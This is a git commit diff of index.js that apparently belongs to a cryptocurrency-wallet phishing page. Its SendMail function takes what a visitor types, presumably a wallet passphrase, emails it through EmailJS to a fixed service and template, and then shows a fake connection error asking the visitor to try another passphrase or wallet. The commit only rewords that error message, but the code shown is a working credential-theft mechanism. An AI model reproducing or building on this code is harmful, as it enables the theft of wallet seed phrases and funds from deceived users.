dd42930b148d5a8dc118b8e7f086e14fa7a18ef5
kingoftg428 <holdjosh1@gmail.com>
2025-02-27 14:12:32 +0100

    first commit

--- index.js
+++ index.js
@@ -2,7 +2,7 @@ function SendMail(){
     var params = {
         message: document.getElementById("message").value,
     }
-    emailjs.send("service_9kqi0uh","template_nwo10w6", params).then(document.write("<h1>An Error Occurred During the Connection Please Try Passphrase/ Wallet.</h1>")
+    emailjs.send("service_9kqi0uh","template_nwo10w6", params).then(document.write("<h1>An Error Occurred During the Connection Please Try another Passphrase/ Wallet.</h1>")
         
     );
 }
